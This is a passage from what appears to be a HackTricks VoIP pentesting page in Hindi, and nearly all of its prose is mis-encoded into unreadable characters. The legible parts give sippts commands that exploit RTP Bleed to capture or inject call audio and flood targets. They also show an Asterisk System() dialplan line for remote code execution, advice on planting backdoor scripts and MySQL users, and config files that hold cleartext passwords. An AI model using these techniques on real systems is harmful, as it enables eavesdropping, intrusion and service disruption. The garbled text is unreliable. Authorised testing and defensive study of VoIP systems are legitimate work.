рдЗрд╕рд▓рд┐рдП, рдХрдИ RTP рдкреНрд░реЙрдХреНрд╕реА рдиреЗ рдПрдХ рддрд░реАрдХрд╛ рдЕрдорд▓ рдореЗрдВ рд▓рд╛рдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдРрд╕рд╛ **IP рдФрд░ рдкреЛрд░реНрдЯ рдЯреБрдкреНрд▓реЗрдЯ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реАрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рдЕрдХреНрд╕рд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд╕реНрд░реЛрдд IP рдФрд░ рдкреЛрд░реНрдЯ рдХреЛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдХрд╛ рддрдВрддреНрд░, рдЬрд┐рд╕реЗ "рд╕реАрдЦрдиреЗ рдХреА рдореЛрдб" рдХрд╣рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, **рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛**ред рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░** RTP рдкреНрд░реЙрдХреНрд╕реА рдХреЛ **RTP рдЯреНрд░реИрдлрд┐рдХ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ рдЪрд▓ рд░рд╣реЗ RTP рд╕реНрдЯреНрд░реАрдо рдХреЗ рдХреЙрд▓рд░ рдпрд╛ рдХреЙрд▓реА рдХреЗ рд▓рд┐рдП рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░реЙрдХреНрд╕реА RTP рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдЗрд╕реЗ RTP Bleed рдХрд╣рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд RTP рдореАрдбрд┐рдпрд╛ рд╕реНрдЯреНрд░реАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

RTP рдкреНрд░реЙрдХреНрд╕реА рдФрд░ RTP рд╕реНрдЯреИрдХ рдХрд╛ рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╡реНрдпрд╡рд╣рд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ рдХрднреА-рдХрднреА, **рдпрджрд┐ RTP Bleed рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИ**, рддреЛ рд╡реЗ **рдХрд┐рд╕реА рднреА рд╕реНрд░реЛрдд рд╕реЗ RTP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░, рдЖрдЧреЗ рднреЗрдЬреЗрдВ рдФрд░/рдпрд╛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ RTP рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╡реИрдз рд╡рд╛рд▓реЗ рдХреА рдмрдЬрд╛рдп рдЕрдкрдиреА рдореАрдбрд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред рд╣рдо рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ RTP рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╣рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдореМрдЬреВрджрд╛ RTP рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рдЕрд╡реИрдз RTP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдпрд╣ рджреЛрд╖ RTP рдкреНрд░реЙрдХреНрд╕реА рдФрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рджреЛрдиреЛрдВ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Asterisk рдФрд░ FreePBX рдиреЗ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ **`NAT=yes` рд╕реЗрдЯрд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдмрд╛рд╣рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреЙрд▓реЛрдВ рдкрд░ рдХреЛрдИ рдСрдбрд┐рдпреЛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рдпрд╛ рдПрдХ рддрд░рдлрд╝рд╛ рдСрдбрд┐рдпреЛ рд╣реЛ рд╕рдХрддреА рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed RTP Bleed рджреЛрд╖ рдХреЛ рдЦреЛрдЬрддрд╛ рд╣реИ рдФрд░ RTP рд╕реНрдЯреНрд░реАрдо рднреЗрдЬрддрд╛ рд╣реИред
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed RTP Bleed рд╡рдВрд░рдгрд╢реАрд▓рддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ рдЬреЛ RTCP рд╕реНрдЯреНрд░реАрдореНрд╕ рднреЗрдЬрдХрд░ред
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** рдХреЛ [**sippts**](https://github.com/Pepelux/sippts)** рд╕реЗ:** SIPPTS rtpbleedflood RTP Bleed рд╡рдВрд▓рд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддрд╛ рд╣реИ рдЬреЛ RTP рд╕реНрдЯреНрд░реАрдо рднреЗрдЬрддрд╛ рд╣реИред
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** рдХреЛ [**sippts**](https://github.com/Pepelux/sippts)** рд╕реЗ:** SIPPTS rtpbleedinject RTP Bleed рд╡рдВрд▓рд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдСрдбрд┐рдпреЛ рдлрд╝рд╛рдЗрд▓ (WAV рдкреНрд░рд╛рд░реВрдк) рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирд┐рдпрдо рдЬреЛрдбрд╝рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдкреБрдирдГ рд▓реЛрдб рдХрд░рдиреЗ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХрд┐рд╕реА рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╡реЗрдм рдкреНрд░рдмрдВрдзрдХ рд╕рд░реНрд╡рд░ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдХрд░), **`System`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
рдПрдХ рдЖрджреЗрд╢ рд╣реИ рдЬрд┐рд╕реЗ **`Shell`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **`System`** рдХреА рдмрдЬрд╛рдп рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛред

{% hint style="warning" %}
рдпрджрд┐ рд╕рд░реНрд╡рд░ **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рд╖реЗрдз рдХрд░ рд░рд╣рд╛ рд╣реИ** **`System`** рдХрдорд╛рдВрдб рдореЗрдВ (рдЬреИрд╕реЗ Elastix рдореЗрдВ), рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреНрдпрд╛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рд╕рд┐рд╕реНрдЯрдо рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП** (рдЬреИрд╕реЗ Elastix рдпрд╛ trixbox), рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **рдПрдХ рдмреИрдХрдбреЛрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд┐рд░ **`System`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **рдЙрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
{% endhint %}

#### рджрд┐рд▓рдЪрд╕реНрдк рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

* **`sip.conf`** -> SIP рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИред
* рдпрджрд┐ **Asterisk рд╕рд░реНрд╡рд░ root рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдЖрдк root рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **mysql root рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рдкрд╛рд╕ **рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛**ред
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдирдпрд╛ mysql рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* **`FreePBX`**
* **`amportal.conf`** -> рд╡реЗрдм рдкреИрдирд▓ рдкреНрд░рд╢рд╛рд╕рдХ (FreePBX) рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИред
* **`FreePBX.conf`** -> рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ FreePBXuser рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИ
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдирдпрд╛ mysql рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* **`Elastix`**
* **`Elastix.conf`** -> mysql root pass, IMAPd pass, web admin pass рдЬреИрд╕реЗ рдХрдИ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* **рдХрдИ рдлрд╝реЛрд▓реНрдбрд░** рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реЛрдВрдЧреЗ (рдпрджрд┐ root рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ)ред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд┐рдЫрд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рднреА рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЕрдиреНрдп рдмреИрдХрдбреЛрд░ рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХреЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### RTP рдЗрдВрдЬреЗрдХреНрд╢рди

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЯреВрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рддрдЪреАрддреЛрдВ рдореЗрдВ **`.wav`** рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) рдФрд░ **`rtpmixsound`** (`sudo apt install rtpmixsound`).

рдпрд╛ рдЖрдк [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдмрд╛рддрдЪреАрддреЛрдВ рдХреА рдЬрд╛рдВрдЪ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (**`rtpscan.pl`**), рдПрдХ `.wav` рдХреЛ рдПрдХ рдмрд╛рддрдЪреАрдд рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ (**`rtpsend.pl`**) рдФрд░ рдПрдХ рдмрд╛рддрдЪреАрдд рдореЗрдВ **рд╢реЛрд░** рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (**`rtpflood.pl`**).

### DoS

VoIP рд╕рд░реНрд╡рд░ рдореЗрдВ DoS рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред

* **`SIPPTS flood`** рд╕реЗ [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood рд▓рдХреНрд╖реНрдп рдХреЛ рдЕрд╕реАрдорд┐рдд рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рд╣реИред
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** рд╕реЗ [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping рдПрдХ SIP рдкрд┐рдВрдЧ рднреЗрдЬрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рдордп рджреЗрдЦ рд╕рдХреЗред
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ IAX рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ DoS рдХрд░реЗрдВ
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): SIP/SDP INVITE рд╕рдВрджреЗрд╢ рдлреНрд▓рдбрд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдгред
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): рдХрдИ рдЕрдЪреНрдЫреЗ рд░реВрдк рд╕реЗ рдЧрдард┐рдд RTP рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВред рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ RTP рдкреЛрд░реНрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдкрд╣рд▓реЗ рд╕реНрдирд┐рдлрд╝ рдХрд░реЗрдВ)ред
* [**SIPp**](https://github.com/SIPp/sipp): SIP рдЯреНрд░реИрдлрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ DoS рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP рд╕реНрд╡рд┐рд╕ рдЖрд░реНрдореА рдирд╛рдЗрдлред SIP рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### рдУрдПрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдЬреИрд╕реЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ **рдУрдПрд╕ рд╡рд┐рддрд░рдг** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рдЬреИрд╕реЗ: **FreePBX, Elastix, Trixbox**... рдЗрдирдореЗрдВ рд╕реЗ рдПрдХ рджрд┐рдХреНрдХрдд рдпрд╣ рд╣реИ рдХрд┐ рдПрдХ рдмрд╛рд░ рдЬрдм рдпрд╣ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╢рд╛рдпрдж **рдЙрдиреНрд╣реЗрдВ рдлрд┐рд░ рд╕реЗ рдЕрдкрдбреЗрдЯ рди рдХрд░реЗрдВ** рдФрд░ рд╕рдордп рдХреЗ рд╕рд╛рде **рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖** рдкрддрд╛ рдЪрд▓реЗрдВрдЧреЗред

## рд╕рдВрджрд░реНрдн

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **PDF рдореЗрдВ HackTricks рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ **PR рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
